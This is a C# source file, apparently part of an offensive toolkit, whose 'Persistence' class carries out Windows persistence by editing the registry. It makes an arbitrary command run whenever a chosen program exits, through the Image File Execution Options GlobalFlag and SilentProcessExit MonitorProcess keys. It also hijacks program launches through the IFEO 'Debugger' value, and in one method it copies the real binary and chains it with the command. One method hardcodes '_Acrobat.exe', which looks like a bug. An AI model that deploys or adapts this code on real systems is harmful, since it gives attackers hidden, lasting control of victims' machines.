using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Persistence
{
    internal class Persistence
    {
        private RegistryKey registryKey = Registry.LocalMachine;

        /// <summary>
        /// Interception of the closure of a certain program and execution of commands at this event
        /// Privileges: Admin
        /// </summary>
        /// <param name="programName">A program whose closure needs to be monitored</param>
        /// <param name="commandToExecute">The command that should be executed</param>
        public void GFlags(string programName, string commandToExecute)
        {
            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
                                                      true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("GlobalFlag", "512", RegistryValueKind.DWord);
            subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{programName}",
                                                    true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("ReportingMode", "1", RegistryValueKind.DWord);
            subkey.SetValue("MonitorProcess", commandToExecute);

            // subkey.SetValue("MonitorProcess", "");
        }

        /// <summary>
        /// Replace the program that will be executed instead of another
        /// </summary>
        /// <param name="programName">A program whose closure needs to be monitored</param>
        /// <param name="commandToExecute">The command that should be executed</param>
        public void ReplaceProgram(string programName, string commandToExecute)
        {
            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
                              true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("Debugger", $"cmd /C {commandToExecute}", RegistryValueKind.String);

            // subkey.DeleteValue("Debugger");
        }
        
        /// <summary>
        /// Running the command after closing the program
        /// </summary>
        /// <param name="programName">A program whose closure needs to be monitored</param>
        /// <param name="commandToExecute">The command that should be executed</param>
        public void ExecProgAndCommand(string programName, string commandToExecute)
        {
            var pathToFile = Utils.FindFile(programName);
            var newPathToFile = Path.Combine(pathToFile.Replace(Path.GetFileName(pathToFile), String.Empty), "_" + Path.GetFileName(pathToFile));

            if (File.Exists(newPathToFile))
                File.Delete(newPathToFile);

            File.Copy(pathToFile, newPathToFile);

            var subkey = registryKey.OpenSubKey(@$"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{programName}",
                                          true);
            ArgumentNullException.ThrowIfNull(subkey);
            subkey.SetValue("Debugger", @$"cmd /C _Acrobat.exe & {commandToExecute}", RegistryValueKind.String);

            // subkey.DeleteValue("Debugger");
        }
    }
}
